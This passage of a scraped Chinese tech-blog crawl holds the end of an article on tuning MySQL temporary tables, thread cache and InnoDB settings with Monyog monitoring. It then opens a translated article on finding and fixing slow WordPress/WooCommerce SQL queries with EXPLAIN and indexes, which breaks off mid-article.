起，这个值定义了可以在内存中创建的临时表的最大大小。如果内存临时表大于此大小，则将其存储在磁盘上。</li>\n<li><strong>内存表的最大大小</strong>：显示max_heap_table_size服务器变量的值，该值定义了显式创建的MEMORY存储引擎表的最大大小。</li>\n<li><strong>创建的临时表总数</strong>：显示created_tmp_tables服务器变量的值，它定义了在内存中创建的临时表的数量。</li>\n<li><strong>在磁盘上创建的临时表</strong>：显示created_tmp_disk_tables服务器变量的值，该变量定义了在磁盘上创建的临时表的数量。如果这个值很高，则应该考虑增加tmp_table_size和max_heap_table_size的值，以便增加创建内存临时表的数量，从而减少在磁盘上创建临时表的数量。</li>\n<li><strong>磁盘：总比率</strong>：基于created_tmp_disk_tables除以created_tmp_tables的计算值。由于tmp_table_size或max_heap_table_size不足而在磁盘上创建的临时表的百分比。Monyog将这个数字显示为一个进度条和百分比，以便快速确定有多少磁盘用于临时表，而不是内存。</li>\n</ul>\n<p>趋势图可用于创建的总表，磁盘上创建的表和磁盘的总比值。这些让我们看到了它们随着时间的演变：</p>\n<h3>技巧#3：增加线程缓存大小</h3>\n<p>连接管理器线程处理服务器监听的网络接口上的客户端连接请求。连接管理器线程将每个客户端连接与专用于它的线程关联，该线程负责处理该连接的身份验证和所有请求处理。因此，线程和当前连接的客户端之间是一对一的比例。确保线程缓存足够大以容纳所有传入请求是非常重要的。</p>\n<p>MySQL提供了许多与连接线程相关的服务器变量：</p>\n<p>线程缓存大小由thread_cache_size系统变量决定。默认值为0（无缓存），这将导致为每个新连接设置一个线程，并在连接终止时需要处理该线程。如果希望服务器每秒接收数百个连接请求，那么应该将thread_cache_size设置的足够高，以便大多数新连接可以使用缓存线程。可以在服务器启动或运行时设置max_connections的值。</p>\n<p>还应该监视缓存中的线程数（Threads_cached）以及创建了多少个线程，因为无法从缓存中获取线程（Threads_created）。关于后者，如果Threads_created继续以每分钟多于几个线程的增加，请考虑增加thread_cache_size的值。</p>\n<p>使用MySQL show status命令显示MySQL的变量和状态信息。这里有几个例子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc620fe3983512139\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSHOW GLOBAL STATUS LIKE '%Threads_connected%';\r\n\r\n+-------------------+-------+\r\n\r\n| Variable_name     | Value |\r\n\r\n+-------------------+-------+\r\n\r\n| Threads_connected | 2     |\r\n\r\n+-------------------+-------+\r\nSHOW GLOBAL STATUS LIKE '%Threads_running%';\r\n\r\n+-----------------+-------+\r\n\r\n| Variable_name   | Value |\r\n\r\n+-----------------+-------+\r\n\r\n| Threads_running | 1     |\r\n\r\n+-----------------+-------+\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc620fe3983512139-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc620fe3983512139-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-1\"><span class=\"crayon-e\">SHOW </span><span class=\"crayon-m\">GLOBAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">STATUS </span><span class=\"crayon-i\">LIKE</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'%Threads_connected%'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-3\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-5\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Variable_name</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-7\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-9\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Threads_connected</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-11\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-12\"><span class=\"crayon-e\">SHOW </span><span class=\"crayon-m\">GLOBAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">STATUS </span><span class=\"crayon-i\">LIKE</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'%Threads_running%'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-14\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-16\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Variable_name</span><span class=\"crayon-h\">   </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-18\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-20\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Threads_running</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc620fe3983512139-22\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc620fe3983512139-23\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0031 seconds] -->\r\n<p><strong>Monyog线程缓存监测</strong></p>\n<p>Monyog提供了一个监控线程缓存的屏幕，名为“线程”。与MySQL线程相关的服务器变量映射到以下Monyog指标：</p>\n<ul>\n<li>thread_cache_size：可以缓存的线程数。</li>\n<li>Threads_cached：缓存中的线程数。</li>\n<li>Threads_created：创建用于处理连接的线程。</li>\n</ul>\n<p>Monyog线程屏幕还包括“线程缓存命中率”指标。这是一个提示线程缓存命中率的指标。如果值较低，则应该考虑增加线程缓存。在状态栏以百分比形式显示该值；它的值越接近100％越好。</p>\n<p>如果这些指标的值等于或超过指定值，则可以将每一个指标配置为发出警告和/或严重警报。</p>\n<h3>其他相关的服务器变量</h3>\n<p>除了上述指标以外，还应该监控以下内容：</p>\n<ol>\n<li><strong>InnoDB缓冲池大小</strong>： InnoDB缓冲池大小在使用InnoDB的MySQL数据库中起着至关重要的作用。缓冲池同时缓存数据和索引。它的值应该尽可能的大，以确保数据库使用内存而不是硬盘驱动器进行读取操作。</li>\n<li><strong>临时表大小</strong>： MySQL使用max_heap_table_size和tmp_table_size中较小的一个来限制内存中临时表的大小。拥有较大的值可以帮助减少在磁盘上创建临时表的数量，但也会增加服务器内存容量的风险，因为这个指标适用于每个客户端。一般来说，32M到64M是建议的值，从这两个变量开始并根据需要进行调优。</li>\n<li><strong>InnoDB日志缓冲区大小</strong>： MySQL每次写入日志文件时，它都会利用可用于处理销售数据的重要系统资源。因此，将InnoDB日志缓冲区大小设置为较大值才有意义。这样，服务器在大型事务中写入磁盘的次数就减少了，从而最大限度地减少了这些耗时的操作。64M是这个变量的一个很好的起点。</li>\n</ol>\n<h3>结论</h3>\n<p>虽然即便是最大的公司网站也会因宕机而遭受损失，但这种影响对于处理网上销售的中小型企业尤其关键。根据<a href=\"https://blog.100tb.com/the-real-cost-of-downtime-for-business\" target=\"_blank\">最近的一份调查报告</a>显示，一分钟的宕机导致企业平均损失约5000美元。不要让你的业务成为那种统计数据（因为宕机造成的损失）的一部分。在假日繁忙之前，主动调优MySQL数据库服务器（S）并收获回报吧！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113197\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113197votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113197\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg"}
{"url_object_id": "1d272b3f5e772e150256c80369d176bd", "title": "提升网站访问速度的 SQL 查询优化技巧", "url": "http://blog.jobbole.com/113222/", "create_date": "2017/12/09", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/d58689380279e0a450fddedcbc06ffc3.jpg"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://deliciousbrains.com/sql-query-optimization/\">Delicious Brains</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/sql-query-optimization\">开源中国</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/d58689380279e0a450fddedcbc06ffc3.jpg\"></p>\n<p>你一定知道，一个快速访问的网站能让用户喜欢，可以帮助网站从Google 上提高排名，可以帮助网站增加转化率。如果你看过网站性能优化方面的文章，例如<a href=\"https://deliciousbrains.com/hosting-wordpress-setup-secure-virtual-server/\" rel=\"nofollow\">设置服务器的最佳实现</a>、到<a href=\"https://deliciousbrains.com/finding-bottlenecks-wordpress-code/\" rel=\"nofollow\">干掉慢速代码</a>以及 <a href=\"https://deliciousbrains.com/wp-offload-s3/doc/why-use-a-cdn/\" rel=\"nofollow\">使用CDN 加载图片</a>，就认为你的 WordPress 网站已经足够快了。但是事实果真如此吗？</p>\n<p>使用动态数据库驱动的网站，例如WordPress，你的网站可能依然有一个问题亟待解决：数据库查询拖慢了网站访问速度。</p>\n<p>在这篇文章中，我将介绍如何识别导致性能出现问题的查询，如何找出它们的问题所在，以及快速修复这些问题和其他加快查询速度的方法。我会把门户网站 deliciousbrains.com 出现的拖慢查询速度的情况作为实际的案例。</p>\n<p>定位</p>\n<p>处理慢SQL查询的第一步是找到慢查询。Ashley已经在之前的<a href=\"https://deliciousbrains.com/finding-bottlenecks-wordpress-code/#query-monitor\" target=\"_blank\" rel=\"nofollow\">博客</a>里面赞扬了调试插件<a href=\"https://wordpress.org/plugins/query-monitor/\" target=\"_blank\" rel=\"nofollow\">Query Monitor</a>，而且这个插件的数据库查询特性使其成为定位慢SQL查询的宝贵工具。该插件会报告所有页面请求过程中的数据库请求，并且可以通过调用这些查询代码或者原件(插件，主题，WordPress核)过滤这些查询，高亮重复查询和慢查询。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/fca1e622eea8f23e013e4680c03d0df1.png\"></p>\n<p>要是不愿意在生产安环境装调试插件(性能开销原因)，也可以打开<a href=\"https://dev.mysql.com/doc/refman/5.7/en/slow-query-log.html\" target=\"_blank\" rel=\"nofollow\">MySQL Slow Query Log</a>，这样在特定时间执行的所有查询都会被记录下来。这种方法配置和设置存放查询位置相对简单。由于这是一个服务级别的调整，性能影响会小于使用调试插件，但当不用的时候也应该关闭。</p>\n<h1>理解</h1>\n<p>一旦你找到了一个你要花很大代价找到的查询，那么接下来就是尝试去理解它并找到是什么让查询变慢。最近，在我们开发我们网站的时候，我们找到了一个要执行8秒的查询。</p>\n<p>我们使用WooCommerce和定制版的WooCommerce软件插件来运行我们的插件商店。此查询的目的是获取那些我们知道客户号的客户的所有订阅。WooCommerce是一个稍微复杂的数据模型，即使订单以自定义的类型存储，用户的ID（商店为每一个用户创建的WordPress）也没有存储在post_author，而是作为后期数据的一部分。订阅软件插件给自义定表创建了一对链接。让我们深入了解查询的更多信息。</p>\n<h1>MySQL是你的朋友</h1>\n<p>MySQL有一个很方便的语句<a href=\"https://dev.mysql.com/doc/refman/5.7/en/describe.html\" target=\"_blank\" rel=\"nofollow\">DESCRIBE</a>，它可以输出表结构的信息，比如字段名，数据类型等等。所以，当你执行DESCRIBE wp_postmeta;你将会看到如下的结果：</p>\n<table>\n<tbody>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<th>Field</th>\n<th>Type</th>\n<th>Null</th>\n<th>Key</th>\n<th>Default</th>\n<th>Extra</th>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>meta_id</td>\n<td>bigint(20) unsigned</td>\n<td>NO</td>\n<td>PRI</td>\n<td>NULL</td>\n<td>auto_increment</td>\n</tr>\n<tr>\n<td>post_id</td>\n<td>bigint(20) unsigned</td>\n<td>NO</td>\n<td>MUL</td>\n<td>0</td>\n<td></td>\n</tr>\n<tr>\n<td>meta_key</td>\n<td>varchar(255)</td>\n<td>YES</td>\n<td>MUL</td>\n<td>NULL</td>\n<td></td>\n</tr>\n<tr>\n<td>meta_value</td>\n<td>longtext</td>\n<td>YES</td>\n<td></td>\n<td>NULL</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>你可能已经知道了这个语句。但是你知道DESCRIBE语句可以放在SELECT, INSERT, UPDATE, REPLACE 和 DELETE语句前边使用吗？更为人们所熟知的是他的同义词 <a href=\"https://dev.mysql.com/doc/refman/5.7/en/explain.html\" target=\"_blank\" rel=\"nofollow\">EXPLAIN</a> ，并将提供有关该语句如何执行的详细信息。</p>\n<p>这是我们查询到的结果：</p>\n<table>\n<tbody>\n<tr>\n<th>id</th>\n<th>select_type</th>\n<th>table</th>\n<th>type</th>\n<th>possible_keys</th>\n<th>key</th>\n<th>key_len</th>\n<th>ref</th>\n<th>rows</th>\n<th>Extra</th>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td>1</td>\n<td>SIMPLE</td>\n<td>pm2</td>\n<td>ref</td>\n<td>meta_key</td>\n<td>meta_key</td>\n<td>576</td>\n<td>const</td>\n<td>28</td>\n<td>Using where; Using temporary; Using filesort</td>\n</tr>\n<tr>\n<td>1</td>\n<td>SIMPLE</td>\n<td>pm</td>\n<td>ref</td>\n<td>post_id,meta_key</td>\n<td>meta_key</td>\n<td>576</td>\n<td>const</td>\n<td>37456</td>\n<td>Using where</td>\n</tr>\n<tr>\n<td>1</td>\n<td>SIMPLE</td>\n<td>p</td>\n<td>eq_ref</td>\n<td>PRIMARY,type_status_date</td>\n<td>PRIMARY</td>\n<td>8</td>\n<td>deliciousbrainsdev.pm.post_id</td>\n<td>1</td>\n<td>Using where</td>\n</tr>\n<tr>\n<td>1</td>\n<td>SIMPLE</td>\n<td>l</td>\n<td>ref</td>\n<td>PRIMARY,order_id</td>\n<td>order_id</td>\n<td>8</td>\n<td>deliciousbrainsdev.pm.post_id</td>\n<td>1</td>\n<td>Using index condition; Using where</td>\n</tr>\n<tr>\n<td>1</td>\n<td>SIMPLE</td>\n<td>s</td>\n<td>eq_ref</td>\n<td>PRIMARY</td>\n<td>PRIMARY</td>\n<td>8</td>\n<td>deliciousbrainsdev.l.key_id</td>\n<td>1</td>\n<td>NULL</td>\n</tr>\n</tbody>\n</table>\n<p>乍一看，这很难解释。幸运的是，人们通过SitePoint总结了一个<a href=\"https://www.sitepoint.com/using-explain-to-write-better-mysql-queries/\" target=\"_blank\" rel=\"nofollow\">理解语句的全面指南</a>。</p>\n<p>最重要的字段是type，它描述了一张表是怎么构成的。如果你想看全部的内容，那就意味着MySQL要从内存读取整张表，增加I/O的速度并在CPU上加载。这种被称为“全表浏览”—稍后将对此进行详细介绍。</p>\n<p>rows字段也是一个好的标识，标识着MySQL将要不得不做的事情，它显示了结果中查找了多少行。</p>\n<p>Explain也给了我们很多可以优化的信息。例如，pm2表（(wp_postmeta），告诉我们是Using filesort，因为我们使用了 ORDER BY语句对结果进行了排序。如果我们要对查询结果进行分组，这将会给执行增加开销。</p>\n<h3>可视化研究</h3>\n<p>对于这种类型的研究，<a href=\"https://www.mysql.com/products/workbench/\" target=\"_blank\" rel=\"nofollow\">MySQL Workbench</a>是另外一个方便，免费的工具。将数据库用MySQL5.6及其以上的版本打开，EXPLAIN的结果可以用JSON格式输出，同时MySQL Workbench将JSON转换成可视化执行语句：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/6775c1e9f8647de59507d737a09bb4b4.png\"></p>\n<p>它自动将查询的问题用颜色着重表示提醒用户去注意。我们可以马上看到，连接wp_woocommerce_software_licences（别名l）的表有严重的问题。</p>\n<h3>解决</h3>\n<p>你<a href=\"https://dev.mysql.com/doc/refman/5.7/en/table-scan-avoidance.html\" target=\"_blank\" rel=\"nofollow\">应该避免</a>这种全部表浏览的查询，因为他使用非索引字段order_id去连接wp_woocommerce_software_licences表和wp_posts表。这对于查询慢是常见的问题，而且也是比较容易解决的问题。</p>\n<h3>索引</h3>\n<p>order_id在表中是一个相当重要的标志性数据，如果想像这种方式查询，我们需要在列上建立一个<a href=\"https://dev.mysql.com/doc/refman/5.7/en/mysql-indexes.html\" target=\"_blank\" rel=\"nofollow\">索引</a>，除此之外，MySQL将逐字扫描表的每一行，直到找到我们想要的行为止。让我们添加一个索引并看看它是怎么样工作的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc63f4cd663064735\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE INDEX order_id ON wp_woocommerce_software_licences(order_id)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4cd663064735-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc63f4cd663064735-1\"><span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">INDEX</span> <span class=\"crayon-v\">order</span><span class=\"crayon-sy\">_</span>id <span class=\"crayon-i\">ON</span> <span class=\"crayon-e\">wp_woocommerce_software_licences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">order_id</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><img 